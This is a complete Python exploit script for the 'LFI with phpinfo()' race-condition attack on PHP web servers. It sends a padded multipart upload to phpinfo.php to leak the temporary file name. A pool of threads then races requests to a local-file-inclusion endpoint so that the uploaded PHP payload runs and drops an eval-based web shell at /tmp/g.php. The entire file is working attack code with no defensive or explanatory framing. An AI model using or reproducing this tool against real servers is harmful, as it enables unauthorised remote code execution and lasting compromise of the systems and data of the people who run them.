import sys
import threading
import socket
def setup(host, port):
    TAG="Locale File Include Vulns!!!"
    PAYLOAD="""%s\r\n<?php $c=fopen('/tmp/g.php','w');fwrite($c,'<?php eval($_GET["f"]);?>');?>\r\n""" % TAG
    REQ1_DATA="""-----------------------------68124396905382484903242131\r\n"""+\
         """Content-Disposition: form-data; name="userfile"; filename="test.txt"\r\n"""+\
         """Content-Type: text/plain\r\n"""+"""\r\n"""+\
         """%s\r\n-----------------------------68124396905382484903242131--""" % PAYLOAD
    padding="A" * 8000
    REQ1="""POST /phpinfo.php?a=%s HTTP/1.1\r\n"""%padding
    temp="""Host: %s\r\n"""%host
    REQ1 = REQ1+temp
    REQ1=REQ1+"""User-Agent: """+padding+"""\r\n"""+\
         """Accept: """+padding+"""\r\n"""+\
         """Accept-Language: """+padding+"""\r\n"""+\
         """Accept-Encoding: """+padding+"""\r\n"""+\
         """Connection: keep-alive\r\n"""+\
         """Content-Type: multipart/form-data; boundary=---------------------------68124396905382484903242131\r\n"""
    REQ1=REQ1+"""Content-Length: %s\r\n\r\n"""%(len(REQ1_DATA))
    REQ1=REQ1+"""%s"""%REQ1_DATA
    #modify this to suit the LFI script
    LFIREQ="""GET /lfi.php?load=%s HTTP/1.1\r\n"""+\
        """Host: %s\r\n"""+\
        """User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1\r\n"""+\
        """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"""+\
        """Accept-Language: en-US,en;q=0.5\r\n"""+\
        """Connection: keep-alive\r\n\r\n"""

    #print REQ1
    return (REQ1, TAG, LFIREQ)
def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
        #print fn
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print ("\nGot it! Shell created in /tmp/g")
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print ("found %s at %i" % (d[i:i+10],i))
    # padded up a bit
    return i+256

def main():
    print ("LFI With PHPInfo()")
    print ("-=" * 30)
    if len(sys.argv) < 2:
        print ("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)
    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print ("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)
    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError as e:
        print ("Error with port %d: %s" % (sys.argv[2], e))
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError as e:
        print ("Error with poolsz %d: %s" % (sys.argv[3], e))
        sys.exit(1)

    print ("Getting initial offset..."),
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print ("Spawning worker pool (%d)..." % poolsz)
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print ("Woot! \m/")
        else:
            print (":(")
    except KeyboardInterrupt:
        print ("\nTelling threads to shutdown...")
        e.set()

    print ("Shuttin' down...")
    for t in tp:
        t.join()
if __name__=="__main__":
    main()